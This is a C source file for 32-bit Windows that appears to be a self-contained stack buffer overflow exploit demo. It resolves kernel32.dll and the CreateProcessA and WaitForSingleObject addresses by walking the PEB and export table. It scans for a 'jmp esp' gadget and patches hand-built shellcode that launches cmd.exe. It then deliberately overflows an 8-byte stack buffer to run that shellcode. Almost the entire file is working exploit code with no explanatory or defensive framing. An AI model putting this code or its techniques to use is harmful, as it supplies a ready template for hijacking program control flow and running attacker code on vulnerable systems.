#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <wchar.h>


typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InMemoryOrderLinks;
    PVOID CodeBase;
    PVOID Reserved2;
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PVOID                         PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;

PPEB GetProcPEB()
{
    __asm mov eax, fs:0x30
}
HMODULE InternalGetModuleHandleW(PWSTR pModuleName)
{
    HMODULE hModule = NULL;
    PPEB ppeb = GetProcPEB();
    PLIST_ENTRY pEntry = &ppeb->Ldr->InMemoryOrderModuleList;
    do {
        pEntry = pEntry->Flink;
        PLDR_DATA_TABLE_ENTRY pDataEntry = (PLDR_DATA_TABLE_ENTRY)pEntry;
        if (0 == wcscmp(pDataEntry->FullDllName.Buffer, pModuleName))
        {
            hModule = (HMODULE)pDataEntry->CodeBase;
            break;
        }
    } while (ppeb->Ldr->InMemoryOrderModuleList.Blink != pEntry);
    return hModule;
}
FARPROC InternalGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    FARPROC pProcAddress = (FARPROC)NULL;
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS32 pImageHeader = (PIMAGE_NT_HEADERS32)((DWORD)hModule + (DWORD)pImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule + (DWORD)pImageHeader->OptionalHeader.DataDirectory->VirtualAddress);
    DWORD *pAddressOfNames       = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
    DWORD *pAddressOfFunctions   = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
    WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);
    for (int i = 0; i < pImageExportDirectory->NumberOfNames; i++)
    {
        //std::cout << i << " - " << (LPCSTR)((DWORD)pAddressOfNames[i] +  (DWORD)hModule) << " - " << pAddressOfNameOrdinals[i] << std::endl; // extra
        if (0 == strcmp((LPCSTR)((DWORD)pAddressOfNames[i] +  (DWORD)hModule), lpProcName))
        {
            pProcAddress = (FARPROC)(pAddressOfFunctions[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
            break;
        }
    }
    return pProcAddress;
}
typedef BOOL (*CREATE_PROCESS_A_PROC)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

/*void shellcode_asm(void)
{
    __asm {
        nop
        nop
        nop
        nop
start:
        mov    ebp, esp
        and    esp, 0xfffffff8

        xor    ebx, ebx
        lea    ecx, [ebx + 0x16]
clear:
        push   ebx
        dec    ecx
        cmp    ecx, ebx
        jne    clear

        mov    byte ptr [esp+0x10],0x44

        push   esp
        lea    ecx, [esp + 0x14]
        push   ecx
        push   ebx
        push   ebx
        push   ebx
        push   ebx
        push   ebx
        push   ebx
        jmp    cmd
create_process:
        push   ebx
        mov    eax, 0x90909090
        call   eax
        push   0xFFFFFFFF
        push   [esp + 4]
        mov    eax, 0x90909090
        call   eax
        mov    esp, ebp
hang:
        jmp   start
cmd:
        call   create_process
        nop
        nop
        nop
        nop
    }
}*/
UCHAR shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x89, 0xE5, 0x83, 0xE4, 0xF8, 0x31,
    0xDB, 0x8D, 0x4B, 0x16, 0x53, 0x49, 0x39, 0xD9, 0x75, 0xFA,
    0xC6, 0x44, 0x24, 0x10, 0x44, 0x54, 0x8D, 0x4C, 0x24, 0x14,
    0x51, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0xEB, 0x19, 0x53,
    0xB8, 0x90, 0x90, 0x90, 0x90, 0xFF, 0xD0, 0x6A, 0xFF, 0xFF,
    0x74, 0x24, 0x04, 0xB8, 0x90, 0x90, 0x90, 0x90, 0xFF, 0xD0,
    0x89, 0xEC, 0xEB, 0xC4, 0xE8, 0xE2, 0xFF, 0xFF, 0xFF, 'c',
    'm', 'd', 0x00
};
UCHAR stack_overflow_data[68];
void foo(void)
{
    HMODULE hModule = InternalGetModuleHandleW(L"kernel32.dll");
    UINT jmp_esp_addr = (UINT) hModule;
    UINT index = 0;
    while (true)
    {
        if (*((USHORT *)jmp_esp_addr) == 0xe4ff)
        {
            break;
        }
        jmp_esp_addr++;
    }
    *((UINT*)&shellcode[0])  = (UINT)jmp_esp_addr;
    *((UINT*)&shellcode[41]) = (UINT)InternalGetProcAddress(hModule, "CreateProcessA");
    *((UINT*)&shellcode[54]) = (UINT)InternalGetProcAddress(hModule, "WaitForSingleObject");

    printf("jmp_esp_addr        : 0x%08X\r\n", *((UINT*)&shellcode[0]));
    printf("CreateProcessA      : 0x%08X\r\n", *((UINT*)&shellcode[41]));
    printf("WaitForSingleObject : 0x%08X\r\n", *((UINT*)&shellcode[54]));

    memset(stack_overflow_data, 0x90, sizeof(stack_overflow_data));
    strcpy((char *)stack_overflow_data + 8, (char *)shellcode);
    printf("UCHAR shellcode[%d] = \"", sizeof(shellcode));
    for (int i = 0; i < sizeof(shellcode); i++)
    {
        printf("\\x%02X", shellcode[i]);
    }
    printf("\";\r\n");
}
int main(int argc, char **argv)
{
    char x[8];
    foo();
    {
        char * d = x;
        char * s = (char *)stack_overflow_data;
        while (*d++ = *s++);
    }
    puts(x);
    return 0;
}
